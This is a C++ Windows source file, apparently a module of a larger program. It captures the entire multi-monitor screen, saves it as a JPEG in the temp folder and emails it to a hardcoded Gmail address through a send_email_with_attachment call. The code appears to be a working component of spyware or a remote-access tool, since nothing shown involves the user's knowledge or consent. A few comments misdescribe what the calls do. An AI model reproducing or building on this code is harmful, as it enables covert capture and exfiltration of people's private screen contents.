#include "sendScreenshot.h"
#include <iostream>
#include <vector>

// Structure to hold monitor information
struct MonitorInfo {
    RECT rect;
    HMONITOR hMonitor;
};

std::vector<MonitorInfo> monitors;

// Callback function to enumerate monitors
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    MonitorInfo info;
    info.hMonitor = hMonitor;
    info.rect = *lprcMonitor;
    monitors.push_back(info);
    
    cout << "Monitor found: " << lprcMonitor->right - lprcMonitor->left 
         << "x" << lprcMonitor->bottom - lprcMonitor->top 
         << " at (" << lprcMonitor->left << "," << lprcMonitor->top << ")" << endl;
    
    return TRUE;
}

// Force DPI awareness - multiple methods for compatibility
void SetDPIAwareness() {
    // Method 1: Windows 10 version 1703+
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* SetProcessDpiAwarenessContextFunc)(DPI_AWARENESS_CONTEXT);
        SetProcessDpiAwarenessContextFunc setProcessDpiAwarenessContext = 
            (SetProcessDpiAwarenessContextFunc)GetProcAddress(hUser32, "SetProcessDpiAwarenessContext");
        if (setProcessDpiAwarenessContext) {
            // Try the most advanced DPI awareness first
            if (setProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2)) {
                cout << "Set DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2" << endl;
                FreeLibrary(hUser32);
                return;
            }
            if (setProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE)) {
                cout << "Set DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE" << endl;
                FreeLibrary(hUser32);
                return;
            }
        }
        FreeLibrary(hUser32);
    }

    // Method 2: Windows 8.1+
    HMODULE hShcore = LoadLibraryA("shcore.dll");
    if (hShcore) {
        typedef HRESULT(WINAPI* SetProcessDpiAwarenessFunc)(int);
        SetProcessDpiAwarenessFunc setProcessDpiAwareness = 
            (SetProcessDpiAwarenessFunc)GetProcAddress(hShcore, "SetProcessDpiAwareness");
        if (setProcessDpiAwareness) {
            HRESULT hr = setProcessDpiAwareness(2); // PROCESS_PER_MONITOR_DPI_AWARE
            if (SUCCEEDED(hr)) {
                cout << "Set PROCESS_PER_MONITOR_DPI_AWARE" << endl;
                FreeLibrary(hShcore);
                return;
            }
        }
        FreeLibrary(hShcore);
    }

    // Method 3: Fallback for older Windows versions
    hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* SetProcessDPIAwareFunc)();
        SetProcessDPIAwareFunc setProcessDPIAware = 
            (SetProcessDPIAwareFunc)GetProcAddress(hUser32, "SetProcessDPIAware");
        if (setProcessDPIAware) {
            if (setProcessDPIAware()) {
                cout << "Set SetProcessDPIAware" << endl;
            }
        }
        FreeLibrary(hUser32);
    }
}

// Get the actual physical screen dimensions
void GetPhysicalScreenDimensions(int& x, int& y, int& width, int& height) {
    // Clear previous monitor data
    monitors.clear();
    
    // Enumerate all monitors
    EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
    
    if (monitors.empty()) {
        // Fallback to primary monitor
        x = 0;
        y = 0;
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        cout << "Fallback to primary monitor: " << width << "x" << height << endl;
        return;
    }
    
    // Calculate bounding rectangle of all monitors
    RECT boundingRect = monitors[0].rect;
    for (const auto& monitor : monitors) {
        UnionRect(&boundingRect, &boundingRect, &monitor.rect);
    }
    
    x = boundingRect.left;
    y = boundingRect.top;
    width = boundingRect.right - boundingRect.left;
    height = boundingRect.bottom - boundingRect.top;
    
    cout << "Total screen area: " << width << "x" << height 
         << " at (" << x << "," << y << ")" << endl;
}

// Alternative method: Direct registry reading for actual resolution
void GetActualScreenResolution(int& width, int& height) {
    // This method reads the actual display resolution from registry
    // Works even when DPI scaling is applied
    
    DEVMODE devMode;
    devMode.dmSize = sizeof(DEVMODE);
    
    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devMode)) {
        width = devMode.dmPelsWidth;
        height = devMode.dmPelsHeight;
        cout << "Registry resolution: " << width << "x" << height << endl;
    } else {
        // Final fallback
        width = 1920;  // Common default
        height = 1080;
        cout << "Using default resolution: " << width << "x" << height << endl;
    }
}

void send_screenshot() {
    // Set DPI awareness first
    SetDPIAwareness();
    
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    
    string screenshot_path = string(temp_path) + "captured_screenshot.jpg";

    int screen_x, screen_y, screen_width, screen_height;
    
    // Try multiple methods to get correct dimensions
    cout << "=== Screen Detection Methods ===" << endl;
    
    // Method 1: Virtual screen metrics
    int virt_x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int virt_y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int virt_w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int virt_h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    cout << "Virtual screen: " << virt_w << "x" << virt_h << " at (" << virt_x << "," << virt_y << ")" << endl;
    
    // Method 2: Physical screen detection
    GetPhysicalScreenDimensions(screen_x, screen_y, screen_width, screen_height);
    
    // Method 3: Registry method for comparison
    int reg_w, reg_h;
    GetActualScreenResolution(reg_w, reg_h);
    
    // Use the largest detected resolution
    if (reg_w > screen_width) {
        screen_width = reg_w;
        screen_height = reg_h;
        screen_x = 0;
        screen_y = 0;
    }
    
    cout << "Final capture dimensions: " << screen_width << "x" << screen_height 
         << " at (" << screen_x << "," << screen_y << ")" << endl;

    // Create device contexts
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) {
        cerr << "Failed to get screen DC. Error: " << GetLastError() << endl;
        return;
    }
    
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        cerr << "Failed to create memory DC. Error: " << GetLastError() << endl;
        ReleaseDC(NULL, hScreenDC);
        return;
    }

    // Create bitmap with exact dimensions
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screen_width, screen_height);
    if (!hBitmap) {
        cerr << "Failed to create bitmap. Error: " << GetLastError() << endl;
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return;
    }

    HGDIOBJ oldBitmap = SelectObject(hMemoryDC, hBitmap);

    // Force high-quality capture
    SetStretchBltMode(hMemoryDC, HALFTONE);
    SetBrushOrgEx(hMemoryDC, 0, 0, NULL);

    // Perform the screen capture
    BOOL result = BitBlt(hMemoryDC, 0, 0, screen_width, screen_height, 
                        hScreenDC, screen_x, screen_y, SRCCOPY | CAPTUREBLT);
    
    if (!result) {
        cerr << "BitBlt failed. Error: " << GetLastError() << endl;
        // Try alternative method
        result = StretchBlt(hMemoryDC, 0, 0, screen_width, screen_height,
                           hScreenDC, screen_x, screen_y, screen_width, screen_height,
                           SRCCOPY | CAPTUREBLT);
    }
    
    if (!result) {
        cerr << "Both BitBlt and StretchBlt failed!" << endl;
    }

    // Get bitmap information
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    cout << "Captured bitmap: " << bmp.bmWidth << "x" << bmp.bmHeight 
         << ", " << bmp.bmBitsPixel << " bits per pixel" << endl;

    // Setup bitmap info for GetDIBits
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = -bmp.bmHeight;  // Negative for top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = 32;  // Force 32-bit for consistency
    bi.biCompression = BI_RGB;

    // Create OpenCV Mat
    cv::Mat screenshot(abs(bi.biHeight), bi.biWidth, CV_8UC4);

    // Get bitmap data using GetDIBits
    int lines = GetDIBits(hScreenDC, hBitmap, 0, abs(bi.biHeight), 
                         screenshot.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    if (lines == 0) {
        cerr << "GetDIBits failed. Error: " << GetLastError() << endl;
    } else {
        cout << "Successfully captured " << lines << " lines" << endl;
    }

    // Convert color format
    cv::Mat bgr_screenshot;
    cv::cvtColor(screenshot, bgr_screenshot, cv::COLOR_BGRA2BGR);

    // Save the image
    if (bgr_screenshot.empty()) {
        cerr << "Screenshot is empty!" << endl;
    } else {
        cout << "Final image size: " << bgr_screenshot.cols << "x" << bgr_screenshot.rows << endl;
        
        if (!cv::imwrite(screenshot_path, bgr_screenshot)) {
            cerr << "Failed to save screenshot!" << endl;
        } else {
            cout << "Screenshot saved successfully to: " << screenshot_path << endl;
            send_email_with_attachment("serverbottestmmt@gmail.com", "Screen Capture",
                                       "Here is a screenshot of the screen.",
                                       screenshot_path);
        }
    }

    // Cleanup
    SelectObject(hMemoryDC, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

// Call this in your main() function BEFORE any GUI operations
void InitializeDPIAwareness() {
    SetDPIAwareness();
    
    // Also try to disable DPI virtualization
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* DisableProcessWindowsGhostingFunc)();
        DisableProcessWindowsGhostingFunc disableGhosting = 
            (DisableProcessWindowsGhostingFunc)GetProcAddress(hUser32, "DisableProcessWindowsGhosting");
        if (disableGhosting) {
            disableGhosting();
        }
        FreeLibrary(hUser32);
    }
}